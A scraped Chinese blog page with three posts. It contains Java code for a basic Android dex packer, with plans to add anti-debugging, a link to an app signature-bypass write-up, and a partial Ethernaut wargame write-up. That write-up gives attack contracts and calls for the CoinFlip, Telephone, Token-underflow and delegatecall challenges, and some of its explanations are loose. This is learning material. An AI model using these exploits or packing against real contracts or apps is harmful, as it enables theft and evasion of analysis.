<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ssjShellTool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] intToByte(<span class="keyword">int</span> number) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>]; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123; </span><br><span class="line">            b[i] = (<span class="keyword">byte</span>) (number % <span class="number">256</span>); </span><br><span class="line">            number &gt;&gt;= <span class="number">8</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> b; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File payloadSrcFile = <span class="keyword">new</span> File(<span class="string">"force/source.apk"</span>);</span><br><span class="line">            System.out.println(<span class="string">"apk size:"</span>+payloadSrcFile.length());</span><br><span class="line">            File unShellDexFile = <span class="keyword">new</span> File(<span class="string">"force/shell.dex"</span>);</span><br><span class="line">            System.out.println(<span class="string">"dex size:"</span>+unShellDexFile.length());</span><br><span class="line">            <span class="keyword">byte</span>[] payloadArray = encrpt(readFileBytes(payloadSrcFile));</span><br><span class="line">            <span class="keyword">byte</span>[] unShellDexArray = readFileBytes(unShellDexFile);</span><br><span class="line">            <span class="keyword">int</span> payloadLen = payloadArray.length;</span><br><span class="line">            <span class="keyword">int</span> unShellDexLen = unShellDexArray.length;</span><br><span class="line">            <span class="keyword">int</span> totalLen = payloadLen + unShellDexLen + <span class="number">4</span>;</span><br><span class="line">            System.out.println(<span class="string">"tot size:"</span>+totalLen);</span><br><span class="line">            <span class="keyword">byte</span>[] newdex = <span class="keyword">new</span> <span class="keyword">byte</span>[totalLen];</span><br><span class="line">            </span><br><span class="line">            System.arraycopy(unShellDexArray, <span class="number">0</span>, newdex, <span class="number">0</span>, unShellDexLen);</span><br><span class="line">            System.arraycopy(payloadArray, <span class="number">0</span>, newdex, unShellDexLen, payloadLen);</span><br><span class="line">            System.arraycopy(intToByte(payloadLen), <span class="number">0</span>, newdex, totalLen-<span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">            fixFileSizeHeader(newdex);</span><br><span class="line">            fixSHA1Header(newdex);</span><br><span class="line">            fixCheckSumHeader(newdex);</span><br><span class="line"></span><br><span class="line">            String str = <span class="string">"force/classes.dex"</span>;</span><br><span class="line">            File file = <span class="keyword">new</span> File(str);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            FileOutputStream localFileOutputStream = <span class="keyword">new</span> FileOutputStream(str);</span><br><span class="line">            localFileOutputStream.write(newdex);</span><br><span class="line">            localFileOutputStream.flush();</span><br><span class="line">            localFileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"finish"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//此处加密</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrpt(<span class="keyword">byte</span>[] srcdata)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;srcdata.length;i++)&#123;</span><br><span class="line">            srcdata[i] = (<span class="keyword">byte</span>)(<span class="number">0xFF</span> ^ srcdata[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcdata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fixCheckSumHeader</span><span class="params">(<span class="keyword">byte</span>[] dexBytes)</span> </span>&#123;</span><br><span class="line">        Adler32 adler = <span class="keyword">new</span> Adler32();</span><br><span class="line">        adler.update(dexBytes, <span class="number">12</span>, dexBytes.length - <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">long</span> value = adler.getValue();</span><br><span class="line">        <span class="keyword">int</span> va = (<span class="keyword">int</span>) value;</span><br><span class="line">        <span class="keyword">byte</span>[] newcs = intToByte(va);</span><br><span class="line">        <span class="keyword">byte</span>[] recs = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            recs[i] = newcs[newcs.length - <span class="number">1</span> - i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(recs, <span class="number">0</span>, dexBytes, <span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fixSHA1Header</span><span class="params">(<span class="keyword">byte</span>[] dexBytes)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"SHA-1"</span>);</span><br><span class="line">        md.update(dexBytes, <span class="number">32</span>, dexBytes.length - <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] newdt = md.digest();</span><br><span class="line">        System.arraycopy(newdt, <span class="number">0</span>, dexBytes, <span class="number">12</span>, <span class="number">20</span>);</span><br><span class="line">        String hexstr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; newdt.length; i++) &#123;</span><br><span class="line">            hexstr += Integer.toString((newdt[i] &amp; <span class="number">0xff</span>) + <span class="number">0x100</span>, <span class="number">16</span>)</span><br><span class="line">                    .substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hexstr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fixFileSizeHeader</span><span class="params">(<span class="keyword">byte</span>[] dexBytes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] newfs = intToByte(dexBytes.length);</span><br><span class="line">        <span class="keyword">byte</span>[] refs = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            refs[i] = newfs[newfs.length - <span class="number">1</span> - i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(refs, <span class="number">0</span>, dexBytes, <span class="number">32</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] readFileBytes(File file) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        ByteArrayOutputStream localByteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fis.read(arrayOfByte);</span><br><span class="line">            <span class="keyword">if</span> (i != -<span class="number">1</span>) &#123;</span><br><span class="line">                localByteArrayOutputStream.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fis.close();</span><br><span class="line">                <span class="keyword">return</span> localByteArrayOutputStream.toByteArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h3><p>综上，这就是一个垃圾壳子。</p>
<p>TODO:</p>
<ul>
<li>搞一个加密算法把内容加密一下</li>
<li>加载源apk的代码写到so里</li>
<li>加些反调试、检测Xposed的内容</li>
<li>后续可能还会升级成类抽取的…</li>
</ul>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/programming/">编程</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-iSmart-break-sign" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/05/10/iSmart-break-sign/" class="article-date">
      <time datetime="2019-05-10T11:33:40.000Z" itemprop="datePublished">2019-05-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/10/iSmart-break-sign/">iSmart逆向分析之绕过签名验证</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>这个iSmart我本想搞一搞它，但是被乱七八糟的事一拖再拖，一直拖到我iSmart<strong>读完了</strong>，没有搞下去的动力了，所以只绕了个签名验证。这个app是个新手练手的好样本，日后有机会或者会继续分析。</p>
<p>扔一个链接。</p>
<p><a href="https://bbs.pediy.com/thread-251339.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251339.htm</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/programming/">编程</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Ethereum-practice" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/25/Ethereum-practice/" class="article-date">
      <time datetime="2019-03-25T11:25:47.000Z" itemprop="datePublished">2019-03-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/25/Ethereum-practice/">ethernaut-writeup</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <blockquote>
<p>这<a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">ethernaut</a>是一个由以太坊智能合约经典漏洞组成的实战wargame，比较适合刚入坑的新手。</p>
</blockquote>
<h2 id="0x00-Hello-Ethernaut"><a href="#0x00-Hello-Ethernaut" class="headerlink" title="0x00 Hello Ethernaut"></a>0x00 Hello Ethernaut</h2><p>这个试试metamask的，按照提示走即可。（这小狐狸是真**可爱）</p>
<h2 id="0x01-fallback"><a href="#0x01-fallback" class="headerlink" title="0x01 fallback"></a>0x01 fallback</h2><p>这个是熟悉平台用的签到题，分析代码，contribute()的意思是一次只能转小于0.001ether，贡献大于1000ether时可以成为owner，但是每次转账操作后都会调用fallback函数，它的fallback函数看一下可以直接让你成为owner，然后调用withdraw()把钱转走，结束。</p>
<blockquote>
<p>contract.contribute({value: 1})</p>
</blockquote>
<blockquote>
<p>contract.sendTransaction({value: 1})</p>
</blockquote>
<blockquote>
<p>contract.withdraw()</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);   </span><br><span class="line">    //我没看明白总觉得写错了。</span><br><span class="line">    //噢我知道了，只有合约生成的时候才调用构造函数。</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-Fallout"><a href="#0x02-Fallout" class="headerlink" title="0x02 Fallout"></a>0x02 Fallout</h2><p>这**有意思，要好眼力啊！orz。</p>
<p><strong>现在构造函数不允许这么写了，要写成constructor () {}</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &apos;zeppelin-solidity/contracts/ownership/Ownable.sol&apos;;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  //这愚蠢的土拨鼠，这不是构造函数，直接调啊！还来个注释，可爱死了。。。</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Coin-Flip"><a href="#0x03-Coin-Flip" class="headerlink" title="0x03 Coin Flip"></a>0x03 Coin Flip</h2><p>这是一个猜硬币的，要连续猜对10次，典型的区块链随机数问题。出题人用<code>block.blockhash(block.number-1)</code>生成随机数，我们可以部署一个新的合约，先预测随机数，再猜。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 <span class="keyword">public</span> consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">  constructor () <span class="keyword">public</span> &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">flip</span><span class="params">(bool _guess)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是</span></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = <span class="number">0x09698a52AEA77e02ef4c5E7fD56d4494Ae2e6B13</span>;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  constructor () <span class="keyword">public</span> &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//按照它的算法算一波</span></span><br><span class="line">  <span class="function">function <span class="title">predict</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(bool)</span></span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-<span class="number">1</span>));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    <span class="keyword">return</span> coinFlip == <span class="number">1</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">hack</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>猜10次也是要了命了……鬼知道我交了金猪？</p>
<h2 id="0x04-Telephone"><a href="#0x04-Telephone" class="headerlink" title="0x04 Telephone"></a>0x04 Telephone</h2><p>这题的考点是tx.origin是合约的发布者，msg.sender是合约的调用者。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = 0x326B80841E0aFD792374E5604E63486303F2913D;</span><br><span class="line">    Telephone target = Telephone(instance_address);</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-Token"><a href="#0x05-Token" class="headerlink" title="0x05 Token"></a>0x05 Token</h2><p>此题考点是上溢。调一下transfer，value给21就行了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     *此处应写为</span><br><span class="line">     *require(balances[msg.sender]&gt;=_value);</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x06-Delegation"><a href="#0x06-Delegation" class="headerlink" title="0x06 Delegation"></a>0x06 Delegation</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract WalletLibaray &#123;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    <span class="function">function <span class="title">WalletLibaray</span><span class="params">(address _owner)</span> </span>&#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">initWallet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    WalletLibaray _walletLib;</span><br><span class="line">    <span class="function">function <span class="title">Wallet</span><span class="params">(address _walletLibAddress)</span> </span>&#123;</span><br><span class="line">        _walletLib = WalletLibaray(_walletLibAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function () &#123;</span><br><span class="line">        <span class="keyword">if</span> (_walletLib.delegatecall(msg.data)) &#123;</span><br><span class="line">            <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题是关于delegatecall的。看一下它的文档。</p>
<blockquote>
<p>There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.</p>
</blockquote>
<p>关于这题，要理解这么两点：</p>
<p>1.delegatecall调用外部合约，上下文是被调用合约。delegatecall的参数可控，可以利用它调用那个pwn()。</p>
<p>2.关于如何利用msg.data调用被调用合约中的函数。这块可以看看编译器对solidity的函数分发实现。msg.data头4个byte是被调用方法的签名哈希，调用函数是向合约账户地址发送msg.data[0:4]，然而就执行函数了，我们只需要获得pwn()的签名哈希，就可以执行pwn()了。</p>
<p>获得pwn()签名哈希的方法。</p>
